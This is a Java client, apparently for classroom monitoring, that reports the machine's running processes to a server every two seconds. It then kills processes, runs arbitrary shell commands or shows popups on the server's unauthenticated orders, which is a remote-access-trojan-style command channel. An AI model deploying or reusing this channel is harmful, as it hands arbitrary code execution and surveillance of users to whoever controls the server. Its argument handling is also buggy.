package base;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import javax.swing.JOptionPane;

import org.apache.commons.lang3.StringUtils;

class SchoolarClient {
	public static Socket clientSocket;
	public static boolean debug = false, defaultSettings = false, rand = false;
	static String ip;
	static int socket;

	public static void main(String args[]) throws Exception {
		if (!debug) {
			if (args.length == 1 && args[0].toString() == "-defaultip") {
				defaultSettings = true;
			} else {
				ip = args[0];
				socket = Integer.parseInt(args[1]);
			}
		}
		Timer timer = new Timer();
		timer.scheduleAtFixedRate(new TimerTask() {
			public void run() {
				sendProcesses();
			}
		}, 0, 2000);
	}

	public static void sendMessage(String msg) {
		String messageRecieve = null;
		try {
			if (defaultSettings) {
				clientSocket = new Socket("127.0.0.1", 25565);
			} else {
				clientSocket = new Socket(ip, socket);
			}
			DataOutputStream outToServer = new DataOutputStream(
					clientSocket.getOutputStream());
			outToServer.writeBytes(msg + '\n');
			BufferedReader inFromServer = new BufferedReader(
					new InputStreamReader(clientSocket.getInputStream()));
			messageRecieve = inFromServer.readLine();
			processMessage(messageRecieve);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void processMessage(String message) {
		debugPrint(message);
		if (message.contains(" killproc ")
				&& message.contains(System.getenv("computername"))) {
			message = message.replace(System.getenv("computername")
					+ " killproc ", "");
			killProcess(message);
		} else if (message.contains(" command ")
				&& message.contains(System.getenv("computername"))) {
			message = message.replace(System.getenv("computername")
					+ " command ", "");
			command(message);
		} else if (message.contains(" popup ")
				&& message.contains(System.getenv("computername"))) {
			message = message.replace(
					System.getenv("computername") + " popup ", "");
			textPopup(message);
		}
	}

	public static void debugPrint(String s) {
		if (debug)
			System.out.println("DEBUG: " + s);
	}

	private static void killProcess(String processName) {
		try {
			Runtime.getRuntime().exec("taskkill /F /IM " + processName);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private static void command(String command) {
		try {
			Runtime.getRuntime().exec(command);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private static void textPopup(String text) {
		JOptionPane.showMessageDialog(null, text);
	}

	public static void sendProcesses() {
		try {
			String processes = "";
			String line = "";
			Process proc = Runtime.getRuntime().exec("tasklist");
			BufferedReader input = new BufferedReader(new InputStreamReader(
					proc.getInputStream()));
			while ((line = input.readLine()) != null) {
				line = StringUtils.substring(line, 0, 30);
				if (!(line.contains("=======") || line.contains("Image Name")
						|| line.contains("System") || line.contains("csrss")
						|| line.contains("dwm") || line.contains("winlogon")
						|| line.contains("svc") || line.contains("taskhost") || line.contains("CCC") 
						|| line.contains("nvtray") || line.contains("nvvsvc")
						|| line.contains("nvxdsync"))
						&& !processes.contains(line)) {
					if (!processes.equalsIgnoreCase(""))
						processes = processes + ":" + line;
					else
						processes = line;
				}
			}
			if (debug)
				processes = Float.toString(new Random().nextFloat()) + ";"
						+ processes;
			else
				processes = System.getenv("computername")+"1" + ";" + processes;
			processes = processes.replaceAll(" ", "");
			input.close();
			sendMessage(processes);
		} catch (Exception err) {
			err.printStackTrace();
		}
	}
}